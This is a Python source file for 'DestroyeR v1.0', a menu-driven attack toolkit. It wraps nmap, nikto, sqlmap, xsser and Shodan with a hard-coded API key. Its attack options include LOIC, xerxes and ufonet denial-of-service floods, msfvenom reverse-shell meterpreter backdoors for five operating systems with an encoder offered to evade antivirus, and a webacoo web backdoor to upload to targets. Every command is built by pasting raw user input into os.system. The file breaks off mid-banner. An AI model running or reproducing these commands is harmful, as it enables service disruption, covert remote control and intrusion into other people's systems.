#Bismillahirrahmanirrahim
import os
import sys
import socket

  
def clear():
  os.system("clear")
  global clear
  return


clear()

end = '\033[1;m'
red = '\033[1;31m'
white = '\033[1;37m'
green = '\033[1;32m'
yellow = '\033[1;33m'
darkblue = '\033[1;34m'
purple = '\033[1;35m'
lightblue = '\033[1;36m'
under = '\033[4m'



#os.system("cd New\ folder\ \(2\)/ && mpv Outblast\ \&\ Angerfist\ feat.\ Tha\ Watcher\ -\ Die\ Hard.mp3")
clear()
  

class destroyer:

  banner =  red + ("""    
                          ...:::::::::...		
  	              ..:::aad8888888baa:::..	
   	           .::::d:?88888888888?::8b::::.	
   	         .:::d8888:?88888888??a888888b:::.	
   	       .:::d8888888a8888888aa8888888888b:::.	
   	      ::::dP::::::::88888888888::::::::Yb::::	
   	     ::::dP:::::::::Y888888888P:::::::::Yb::::	
  	    ::::d8:::::::::::Y8888888P:::::::::::8b::::	
   	   .::::88::::::::::::Y88888P::::::::::::88::::.	
   	   :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::	
   	   :::::::Y88888888888P::|::Y88888888888P:::::::	
   	   ::::::::::::::::888:::|:::888::::::::::::::::	
   	    :::::::::::::::8888888888888b::::::::::::::	
   	    :::::::::::::::88888888888888::::::::::::::	
   	     :::::::::::::d88888888888888::::::::::::: 	
   	      ::::::::::::88::88::88:::88::::::::::::	
   	        ::::::::::88::88::88:::88::::::::::	
   	          ::::::::88::88::P::::88::::::::	
   	            ::::::88::88:::::::88::::::	
   	                :::::::::::::::::::	
   	                     ::::::::: 
   """+end)
  author = lightblue + ("""
  
   ***\:--------------{Coded By D4r7h V4d3R}--------------:/***
       ***\:-----------{N0 Sys7em 1s S4f3!}------------:/***
          ***\:---------{Happy H4c\<1ng!!}----------:/***
             ***\:-------{DestroyeR v1.0}--------:/***
   """) + end
  
  print(banner)
  print(author)
  menu = green + ("""
  [01]--=> Information Gathering
  [02]--=> Vulnerability Analysis
  [03]--=> Exploitation
  [04]--=> Starting Anonymizing
  [05]--=> Networking
  [06]--=> Service Start/Stop
  [07]--=> Protocol Scan
  [08]--=> Malware Scan
  [09]--=> Install
  [10]--=> Credits
  [11]--=> Exit
  """) + end
  print (menu)
  print(yellow + "   Welcome!!\n" + end)#We are not Alone 53

  while (True):

   if os.geteuid() != 0:
     clear()
     print(lightblue + "\n DestroyeR v1.0 " + end)
     print(red + "\n Are you Root... \n\nExiting ...\n" + end)
     os.system("exit 1")
     break

   choice = raw_input(white + "d357r0y3r ~# " + end)

   if(choice=="1"):
     clear()
     inf = darkblue + ("""
                              s                                           .    
                            :8      .uef^"                              @88>  
                           .88    :d88E                     .u    .     %8P      u.    u.               
     uL           u       :888ooo `888E            .u     .d88B :@8c     .     x@88k u@88c.      uL     
 .ue888Nc..    us888u.  -*8888888  888E .z8k    ud8888.  ="8888f8888r  .@88u  ^"8888""8888"  .ue888Nc.. 
d88E`"888E` .@88 "8888"   8888     888E~?888L :888'8888.   4888>'88"  ''888E`   8888  888R  d88E`"888E` 
888E  888E  9888  9888    8888     888E  888E d888 '88%"   4888> '      888E    8888  888R  888E  888E  
888E  888E  9888  9888    8888     888E  888E 8888.+"      4888>        888E    8888  888R  888E  888E  
888E  888E  9888  9888   .8888Lu=  888E  888E 8888L       .d888L .+     888E    8888  888R  888E  888E  
888& .888E  9888  9888   ^%888*    888E  888E '8888c. .+  ^"8888*"      888&   "*88*" 8888" 888& .888E  
*888" 888&  "888*""888"    'Y"    m888N= 888>  "88888%       "Y"        R888"    ""   'Y"   *888" 888&  
 `"   "888E  ^Y"   ^Y'             `Y"   888     "YP'                    ""                  `"   "888E 
.dWi   `88E                             J88"                                                .dWi   `88E 
4888~  J8%                              @%                                                  4888~  J8%  
 ^"===*"`                             :"                                                     ^"===*"`                                        
     
     """) + end

     

     print(inf)

     def infg():
       print white + ("""
       01 == Protocol & Port Scan
       02 == Live Host & Local Network Scan
       03 == Anonym Scan (Zombie ,ACK request)
       00 == Main Menu
    
       """) + end
       
       

     def poroska():
       print lightblue + ("""
        _____   ______  _____  _______  _____  _______  _____        
       |_____] |_____/ |     |    |    |     | |       |     | |     
       |       |    \_ |_____|    |    |_____| |_____  |_____| |_____

                                  &                  
       _____   _____   ______ _______      _______ _______ _______ __   _
      |_____] |     | |_____/    |         |______ |       |_____| | \  |
      |       |_____| |    \_    |         ______| |_____  |     | |  \_|
     """) + end
     global poroska

     infg()
     infra = raw_input(red + "Information Gathering :" + end)
     if(infra=="1"):
       poroska()
       pos = purple + ("""
       01 == Tcp  Scan
       02 == Udp  Scan
       03 == Port Scan                                        
       04 == Script Scan
       05 == Advanced (agressive) Scan
       06 == Subdomain Scan
       07 == WHOIS
       08 == Os Detection
       00 == Back To Information Gathering
       """ + end)
       print (pos)
       poraw = raw_input(yellow + "Protocol & Port Scan :" + end)
       if(poraw=="1"):
         slm = raw_input("Target :")
         os.system("nmap -sT " + slm)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        ..:We Live In Lie:.. " + end)#????
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(poraw=="2"):
         marq = raw_input("Target :")
         os.system("nmap -sU " + marq)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        ..:We Live In Lie:.. " + end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(poraw=="3"):
         kr = raw_input("Target :")
         os.system("nmap --top-ports 15 -sV " + kr)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                       ..:We Live In Lie:.. " + end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(poraw=="4"):
         br = raw_input("Target :")
         os.system("nmap --script all -T4 " + br)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        ..:We Live In Lie:.. " + end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(poraw=="5"):
         arr = raw_input("Target :")
         os.system("nmap -A -T4 " + arr)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        ..:We Live In Lie:.. " + end)
         clear()
         poroska()
         print(pos)
         poraw = raw_input("Protocol & Port Scan :")

       elif(poraw=="6"):
         sar = raw_input("Target :")
         os.system("dmitry -s " + sar)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        ..:We Live In Lie:.. " + end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(poraw=="7"):
         whora = raw_input("Target :")
         os.system("dmitry -n -s -i " + whora)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        ..:We Live In Lie:.. " + end)#GoNdEfmX.dafy
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(poraw=="8"):
         osraw = raw_input("Target :")
         os.system("nmap -O --osscan-guess " + osraw)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        ..:We Live In Lie:.. " + end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice
       elif(poraw=="0"):
         clear()
       print(banner) 
       print(author)
       print(menu)
    


     elif(infra=="0"):
       clear()
       print(banner) 
       print(author)
       print(menu)


      
     elif(infra=="2"):
        liban = lightblue + ("""
                          _____ _    _ _______
                   |        |    \  /  |______
                   |_____ __|__   \/   |______
                            
                                  &
        __   _ _______ _______ _  _  _  _____   ______ _     _
        | \  | |______    |    |  |  | |     | |_____/ |____/ 
        |  \_| |______    |    |__|__| |_____| |    \_ |    \_
       """) + end
        live = yellow + ("""
        01 == Live Host Identification
        02 == Local Network Indentification
        00 == Back to Information Gathering
        """) + end
        print (liban)
        print(live)
        liraw = raw_input(purple + "Live Host & Local Network Scan :" + end)
        if(liraw=="1"):
          laraw = raw_input("Enter a Scan Range :")
          os.system("netdiscover -r " + laraw)
          raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:Open Your Eyes:. " + end)#
          clear()
          print(banner) 
          print(author)
          print(menu)
          choice

        elif(liraw=="2"):
          lbraw = raw_input("Enter Your Interface :")
          os.system("netdiscover -i "+lbraw)
          raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:Open Your Eyes:. " + end)
          clear()
          print(banner) 
          print(author)
          print(menu)
          choice
        
        elif(liraw=="0"):
          clear()
          print(banner) 
          print(author)
          print(menu)

          
     elif(infra=="3"):
       anos = lightblue + ("""
        _______ __   _  _____  __   _ __   __ _______
        |_____| | \  | |     | | \  |   \_/   |  |  |
        |     | |  \_| |_____| |  \_|    |    |  |  |
                                              
        _______ _______ _______ __   _
        |______ |       |_____| | \  |
        ______| |_____  |     | |  \_|
       """) + end

       anon =red + ("""
       01 == Nmap Decoy Scan
       02 == Nmap Zombie Scan
       03 == Packet Ethernation
       04 == Scan on Proxys
       00 == Main Menu
       """) + end
       print(anos)
       print(anon)
       annym = raw_input(darkblue + "Anonym Scan :" + end)
       if(annym=="1"):
         draw = raw_input("Decoy IP :")
         traw = raw_input("Target :")
         os.system("nmap -D " + draw +" "+ traw)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Future Is Today:." + end)   
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(annym=="2"):
         zraw = raw_input("Zombie IP :")
         araw = raw_input("Target :")
         os.system("nmap -sI " + zraw + " "+araw)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Future Is Today:." + end)   
         clear()
         print(banner) 
         print(author)
         print(menu)
         annym


       elif(annym=="3"):
         dvarf = raw_input("Target :")
         os.system("nmap -f " +dvarf)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Future Is Today:." + end)   
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice


       elif(annym=="4"):
         praw = raw_input("Target :")
         os.system("proxychains nmap " + praw)
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Future Is Today:." + end)   
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice


       elif(annym=="5"):
         clear()
       print(banner) 
       print(author)
       print(menu)

            
     else:
      clear()
      print(banner) 
      print(author)
      print(menu)

   elif(choice=="2"):
     ysis = darkblue + ("""

       @@@@@@   @@@  @@@   @@@@@@   @@@       @@@ @@@   @@@@@@   @@@   @@@@@@   
      @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@       @@@ @@@  @@@@@@@   @@@  @@@@@@@   
      @@!  @@@  @@!@!@@@  @@!  @@@  @@!       @@! !@@  !@@       @@!  !@@       
      !@!  @!@  !@!!@!@!  !@!  @!@  !@!       !@! @!!  !@!       !@!  !@!       
      @!@!@!@!  @!@ !!@!  @!@!@!@!  @!!        !@!@!   !!@@!!    !!@  !!@@!!    
      !!!@!!!!  !@!  !!!  !!!@!!!!  !!!         @!!!    !!@!!!   !!!   !!@!!!   
      !!:  !!!  !!:  !!!  !!:  !!!  !!:         !!:         !:!  !!:       !:!  
      :!:  !:!  :!:  !:!  :!:  !:!   :!:        :!:        !:!   :!:      !:!   
      ::   :::   ::   ::  ::   :::   :: ::::     ::    :::: ::    ::  :::: ::   
       :   : :  ::    :    :   : :  : :: : :     :     :: : :    :    :: : :    
     
     """) + end
     clear()
     print(ysis)
     def vanal():
      print white + ("""
      01 == Shodan Analysis
      02 == Deep Analysis
      03 == Speed Analysis
      04 == Nmap Vuln Analysis
      00 == Main Menu

     """) + end
     vanal()
     varaw = raw_input(red + "Vulnerability Analysis :" + end)
     if(varaw=="1"):
       shoraw = raw_input(lightblue + "\nTarget :" + end)
       os.system("cd Tools/shodan-python-master/shodan/ && python __main__.py init 4kzXeH7WZYkcG9ympLNF4LXFYGi1dE7T && python __main__.py host " + shoraw)
     
     elif(varaw=="2"):
       anat = raw_input(lightblue + "\nTarget :" + end)
       os.system("golismero --full scan " + varaw)
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                          .:Wake UP Neo:. " + end)
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice

     
     elif(varaw=="3"):
       sraw = raw_input(lightblue + "\nTarget :" + end)
       os.system("nikto -host " + sraw)      
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                          .:Wake UP Neo:. " + end)#http://8aroyra1rreuywpyz.taur
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice


     elif(varaw=="4"):
       nraw = raw_input(lightblue + "\nTarget :" + end)
       os.system("nmap --script Vuln " + nraw)
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                          .:Wake UP Neo:. " + end)#37 09'33.8"N 93 00'14.7"W
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice

      
     elif(varaw=="0"):
       clear()
       print(banner)
       print(author)
       print(menu)

     else:
       clear()
       print(banner) 
       print(author)
       print(menu)

   elif(choice=="3"):
     clear()
     expo = darkblue + ("""
                                                                         s    
                                       .dd88"                @88>      :8    
              uL   ..    .d``          5888R          u.     %8P      .88    
     .u     .@88b  @88R  @8Ne.   .u    '888R    ...ue888b     .      :888ooo 
  ud8888.  '"Y888k/"*P   %8888:u@88N    888R    888R Y888r  .@88u  -*8888888 
:888'8888.    Y888L       `888I  888.   888R    888R I888> ''888E`   8888    
d888 '88%"     8888        888I  888I   888R    888R I888>   888E    8888    
8888.+"        `888N       888I  888I   888R    888R I888>   888E    8888    
8888L       .u./"888&    uW888L  888'   888R   u8888cJ888    888E   .8888Lu= 
'8888c. .+ d888" Y888*" '*88888Nu88P   .888B .  "*888*P"     888&   ^%888*   
 "88888%   ` "Y   Y"    ~ '88888F`     ^*888%     'Y"        R888"    'Y"    
   "YP'                    888 ^         "%                   ""             
                           *8E                                               
                           '8>                                                                                                                         
       """) + end

     exmen = white + ("""
       01 == Start Dos/DDos
       02 == Create a Backdoor
       03 == Sql & Xss Inj
       04 == Searchsploit
       05 == Web Backdoor
       06 == Nmap Exploiting
       00 == Main Menu

     """) + end
     print(expo)
     print(exmen)
     
     exraw = raw_input(red + "Exploitation :" + end)
     if(exraw=="1"):
       dosban = red + ("""
     dBBBBb  dBBBBP.dBBBBP
        dB' dBP.BP BP     
   dBP dB' dBP.BP  `BBBBb 
  dBP dB' dBP.BP      dBP 
 dBBBBB' dBBBBP  dBBBBP'  
         
         """) + end
       dostype = lightblue + ("\n  01 == Dos \n  02 == Ddos\n  00 == Return To Main Menu\n") + end
       print(dosban)
       print(dostype)
       dossel = raw_input(purple + "Dos Type :" + end)      
       if(dossel=="1"):
         dos = green + ("""
         01 == Loic
         02 == xerxes
         """) + end
         print(dos)
         doraw = raw_input(darkblue + "Select Dos Tools :" + end)
         if (doraw == "1"):
           os.system("cd Tools/LOIC/ && bash loic.sh install && bash loic.sh run")
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                       .:Research Don't Sleep:."+ end)#http://euejhyatgqozip2d8ej21.clos/
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice  

         elif(doraw=="2"):
           lotar = raw_input("Target(Url) :")
           os.system("cd Tools/xerxes-master/ && gcc xerxes.c -o xerxes && ./xerxes " + lotar + " 80")
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice
      
       elif(dossel=="2"):
         highvol= raw_input("Target(with http(s)://) :")
         print(red + "\nThis May Hurt!!" + end)
         os.system("cd Tools/ufonet-master/ &&  ./ufonet -a " + highvol + " -r '100' --loic '1000' --loris '1000' --ufosyn '1000' --spray '1000' --smurf '1000' --xmas '1000' --nuke '1000' --tachyon '1000' --threads '100'")
         raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                      .:Research Don't Sleep:."+ end)#30.021886, 31.721032#29.906577,31.1334073
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice

       elif(dossel=="0"):
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice  

     elif(exraw=="2"):
       back = red + ("""
    dBBBBb dBBBBBb     dBBBP  dBP dBP dBBBBb  dBBBBP dBBBBP dBBBBBb
       dBP      BB           d8P.dBP     dBP dBP.BP dBP.BP      dBP
   dBBBK'   dBP BB   dBP    dBBBBP  dBP dBP dBP.BP dBP.BP   dBBBBK 
  dB' db   dBP  BB  dBP    dBP BB  dBP dBP dBP.BP dBP.BP   dBP  BB 
 dBBBBP'  dBBBBBBB dBBBBP dBP dBP dBBBBBP dBBBBP dBBBBP   dBP  dB' 
      """) + end

       system = lightblue + ("""
       01 == Windows Backdoor
       02 == Linux Backdoor
       03 == Android Backdoor
       04 == Apple Ios Backdoor
       05 == Apple Mac Backdoor
       06 == Sessions 
       00 == Back to Exploit Menu
       """) + end
       print(back)
       print(system)
       backdoor = raw_input("Create a Backdoor :") 
       if(backdoor=="1"):
         ftype = raw_input("Format/File Type :")
         lhost = raw_input("LHOST :")
         output = raw_input("Output Path :")
         cryp = raw_input("Encoder ?/For FUD y/n :")
         if(cryp=="y"):
           os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " -e"+ " x86/shikata_ga_nai" + " -f" + ftype + " -o" + output +"/backdoor." + ftype )
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      
         elif(cryp=="n"):
           os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " -f" + ftype + " -o" + output +"/backdoor." + ftype )
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      
       elif(backdoor=="2"):
         ftype = raw_input("Format/File Type :")
         lhost = raw_input("LHOST :")
         output = raw_input("Output Path :")
         cryp = raw_input("Encoder ?/For FUD y/n :")
         if(cryp=="y"):
           os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + lhost + " -e"+ " x86/shikata_ga_nai" + " -f" + ftype + " -o" + output +"/backdoor." + ftype )
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice

         elif(cryp=="n"):
           os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + lhost + " -f" + ftype + " -o" + output +"/backdoor." + ftype )
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice    

       elif(backdoor=="3"):
         lhost = raw_input("LHOST :")
         output = raw_input("Output Path :")
         cryp = raw_input("Encoder ?/For FUD y/n :")
         if(cryp=="y"):
           os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " -e"+ " x86/shikata_ga_nai" + " -o" + output +"/backdoor.apk")
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      
        
         elif(cryp=="n"):
           os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost  + " -o" + output +"/backdoor.apk" )
 
       elif(backdoor=="4"):
         lhost = raw_input("LHOST :")
         output = raw_input("Output Path :")
         cryp = raw_input("Encoder ?/For FUD y/n :")
         if(cryp=="y"):
           os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=" + lhost + " -e"+ " x86/shikata_ga_nai" + " -o" + output +"/backdoor.apk")
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)#OPEN THE GATES STORM IS COMING
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      
         
         elif(cryp=="n"):
           os.system("msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=" + lhost + " -o" + output +"/backdoor.apk" )
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)#35 31'36.9"N 104 34'19.3"W
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      

       elif(backdoor=="5"):
         lhost = raw_input("LHOST :")
         output = raw_input("Output Path :")
         cryp = raw_input("Encoder ?/For FUD y/n :")
         if(cryp=="y"):
           os.system("msfvenom -p osx/ppc/shell_reverse_tcp LHOST=" + lhost + " -e" + " x86/shikata_ga_nai" + " -o" + output +"/backdoor.app" )
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      
        
         elif(cryp=="n"):
           os.system("msfvenom -p osx/ppc/shell_reverse_tcp LHOST=" + lhost + " -o" + output +"/backdoor.app" )
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      

       elif(backdoor=="6"):
         print(yellow + "  Starting Msfconsole For Sessions Write <Sessions -l>\n\n" + end)
         os.system("msfconsole")

       elif(backdoor=="0"):
         clear()
         print(banner) 
         print(author)
         print(menu)

       else:
         clear()
         print(banner) 
         print(author)
         print(menu)

     elif(exraw=="3"):
       bannij = red + ("""
       `Bb  .BP .dBBBBP.dBBBBP     .dBBBBP   dBBBBP  dBP
         `K.BP  BP     BP          BP       dBP.BP      
         dBBK   `BBBBb `BBBBb   &  `BBBBb  dBP.BP  dBP  
        dB'        dBP    dBP         dBP dBP.BB  dBP   
       dB' dBPdBBBBP'dBBBBP'     dBBBBP' dBBBB'B dBBBBP 
      """) + end                                          

       inj = lightblue + ("""
       01 == Sql Attack
       02 == Xss Attack
       00 == Main Menu
       """) + end
       print(bannij)
       print(inj)
       injraw = raw_input("Sql & Xss Inj :")
       if(injraw=="1"):
         injurl = raw_input("Vulnerable Url :")
         os.system("sqlmap -a -u" + injurl)
         raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice      

       elif(injraw=="2"):
         print("""
         01 == Automatic Inj
         02 == Manuel Inj
         00 == Main Menu
         """)
         xssraw = raw_input("Xss Inj :")
         if(xssraw=="1"):
           os.system("xsser --wizard") or ("apt-get install xsser")
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      

         elif(xssraw=="2"):
           xsstar = raw_input("Target :")
           os.system("-u " + xsstar + " --reverse-check -auto")
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice      

         elif(xssraw=="0"):
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice 

       elif(injraw=="0"):
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice 

     elif(exraw=="4"):
       seraw = raw_input("Enter Title or Vuln Number :")
       os.system("searchsploit " + seraw)
       raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                      .:Research Don't Sleep:."+ end)
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice      

     elif(exraw=="5"):
         soban= red + ("""

     dBPdBPdBP dBBBP dBBBBb
                        dBP
   dBPdBPdBP dBBP   dBBBK' 
  dBPdBPdBP dBP    dB' db  
 dBBBBBBBP dBBBBP dBBBBP'  
                           
    dBBBBb dBBBBBb     dBBBP  dBP dBP dBBBBb  dBBBBP dBBBBP dBBBBBb
       dBP      BB           d8P.dBP     dBP dBP.BP dBP.BP      dBP
   dBBBK'   dBP BB   dBP    dBBBBP  dBP dBP dBP.BP dBP.BP   dBBBBK 
  dB' db   dBP  BB  dBP    dBP BB  dBP dBP dBP.BP dBP.BP   dBP  BB 
 dBBBBP'  dBBBBBBB dBBBBP dBP dBP dBBBBBP dBBBBP dBBBBP   dBP  dB' 

         """) + end
         weba = lightblue + ("""
         01 == Create Web Backdoor
         02 == Backdoor Exploiting
         00 == Return To Main Menu
         """) + end
         print(soban)
         print(weba)
         weraw = raw_input("Web Backdoor :")
         if(weraw=="1"):
           backraw = raw_input("Output :")
           os.system("webacoo -g -o " + backraw)
           print(green +"\n\n   Ok.. Now Upload Exploit On Target" + end)
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                      .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice 

         elif(weraw=="2"):
           wexraw = raw_input("Web Backdoor Path :")
           os.system("webacoo -t -u " + wexraw)
           raw = raw_input (yellow + "\n\n                                        \----------(Click Enter Back to Main Menu)----------/\n                                                      .:Research Don't Sleep:."+ end)
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice 

         elif(weraw=="0"):
           clear()
           print(banner) 
           print(author)
           print(menu)
           choice 

     elif(exraw=="6"):
       nban = red + ("""
     dBBBBb  dBBBBBBb dBBBBBb   dBBBBBb
        dBP       dBP      BB       dB'
   dBP dBP dBPdBPdBP   dBP BB   dBBBP' 
  dBP dBP dBPdBPdBP   dBP  BB  dBP     
 dBP dBP dBPdBPdBP   dBBBBBBB dBP      
                                       
     dBBBP`Bb  .BP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP dBP dBBBBb  dBBBBb
              .BP       dB'        dBP.BP                      dBP        
   dBBP     dBBK    dBBBP' dBP    dBP.BP dBP    dBP   dBP dBP dBP dBBBB   
  dBP      dB'     dBP    dBP    dBP.BP dBP    dBP   dBP dBP dBP dB' BB   
 dBBBBP   dB' dBP dBP    dBBBBP dBBBBP dBP    dBP   dBP dBP dBP dBBBBBB          
       
       """) + end
       print(nban)
       ntar = raw_input("Target :")
       os.system("nmap --script Intrusive " + ntar)

     elif(exraw=="0"):
       clear()
       print(banner) 
       print(author)
       print(menu)

     else:
       clear()
       print(banner) 
       print(author)
       print(menu)

   elif(choice=="4"):
     clear()
     anony = darkblue + ("""
          :::    ::::    ::: :::::::: ::::    ::::::   ::: :::   ::: 
       :+: :+:  :+:+:   :+::+:    :+::+:+:   :+::+:   :+::+:+: :+:+: 
     +:+   +:+ :+:+:+  +:++:+    +:+:+:+:+  +:+ +:+ +:++:+ +:+:+ +:+ 
   +#++:++#++:+#+ +:+ +#++#+    +:++#+ +:+ +#+  +#++: +#+  +:+  +#+  
  +#+     +#++#+  +#+#+#+#+    +#++#+  +#+#+#   +#+  +#+       +#+   
 #+#     #+##+#   #+#+##+#    #+##+#   #+#+#   #+#  #+#       #+#    
###     ######    #### ######## ###    ####   ###  ###       ###     

     
     """) + end
     print(anony)
     anoncho = ( white + """
     01 == AnonSurf
     02 == Nipe
     03 == 4nonimizer
     00 == Main Menu
     """ + end)
     print(anoncho)
     anonmy = raw_input(red + "Anonym :" + end)
     def anny():
       anys = raw_input("AnonSurf is not Installed\n Do You Want To Install y/n : ")
       if(anys=="y"):
         os.system("git clone -s https://github.com/Und3rf10w/kali-anonsurf.git -u /Tools && cd kali-anonsurf && bash installer.sh")
       elif(anys=="n"):
         pass
       return
     def nian():
       nipe = raw_input("Nipe is not Installed\n Do You Want To Install y/n : ")
       if(nipe=="y"):
         os.system("git clone -s https://github.com/GouveaHeitor/nipe.git -u /Tools && cd Tools && cpan install Switch JSON LWP::UserAgent && nipe start") 
       elif(nipe=="n"):
         pass
       return     
     def anon():
       anonmz = raw_input("4anonymizer is not Installed\n Do You Want To Install y/n :")
       if(anonmz == "y"):
         os.system("git clone -s https://github.com/Hackplayers/4nonimizer.git -u Tools/ && 4nonimizer install && 4nonimizer start")
       elif(anonmy=="n"):
         pass
       return

     if(anonmy=="1"):
       os.system("anonsurf start") or anny()
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:Maybe ,Why Not:." + end)
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice           

     elif(anonmy=="2"):
       os.system("cd nipe/ && perl nipe.pl start") or nian()
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:Maybe ,Why Not:." + end)
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(anonmy=="3"):
       os.system("cd Tools/4nonimizer-master && ./4nonimizer install") or anon()
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:Maybe ,Why Not:." + end)
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(anonmy=="0"):
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice      

     else:
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice      

   elif(choice=="5"):
     clear()
     snpo = darkblue + ("""
      ___           ___                       ___           ___     
     /__/\         /  /\          ___        /__/\         /  /\    
     \  \:\       /  /:/_        /  /\      _\_ \:\       /  /::\   
      \  \:\     /  /:/ /\      /  /:/     /__/\ \:\     /  /:/\:\  
  _____\__\:\   /  /:/ /:/_    /  /:/     _\_ \:\ \:\   /  /:/  \:\ 
 /__/::::::::\ /__/:/ /:/ /\  /  /::\    /__/\ \:\ \:\ /__/:/ \__\:\\
